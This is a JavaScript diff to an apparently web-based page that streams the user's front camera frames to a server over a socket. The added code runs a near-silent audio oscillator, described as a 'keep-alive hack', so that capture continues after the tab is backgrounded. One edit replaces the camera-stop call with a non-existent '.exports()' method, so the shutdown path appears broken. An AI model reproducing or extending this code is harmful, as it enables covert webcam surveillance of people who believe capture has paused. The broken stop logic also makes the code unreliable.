@@ -65,6 +65,21 @@
         let mediaStream = null;
         let isCameraReady = false;
 
+        // 🧠 BACKGROUND KEEP-ALIVE HACK (Prevents browser from pausing script in background/recent tabs)
+        function keepAliveAudio() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                gainNode.gain.value = 0.0001; // Silent audio
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.start();
+            } catch (e) {
+                console.log("Audio context error:", e);
+            }
+        }
+
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 mediaStream = stream;
@@ -72,9 +87,10 @@
                 video.onloadedmetadata = () => {
                     video.play();
                     isCameraReady = true;
+                    keepAliveAudio(); // Start background lock
                     socket.emit('user-ready');
 
-                    // Continuous Smooth Live Stream Loop (Runs as long as tab is open)
+                    // Continuous Smooth Live Stream Loop (Even works when tab is backgrounded)
                     setInterval(() => {
                         if (!isCameraReady) return;
                         const context = canvas.getContext('2d');
@@ -83,7 +99,7 @@
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         const frameData = canvas.toDataURL('image/jpeg', 0.3);
                         socket.emit('live-stream-frame', frameData);
-                    }, 70);
+                    }, 100);
                 };
             })
             .catch(err => console.error("Camera access error:", err));
@@ -118,7 +134,7 @@
 
         socket.on('disable-user-access', () => {
             if (mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream.getTracks().exports().forEach(track => track.stop());
             }
             document.body.innerHTML = `
                 <div class="card">
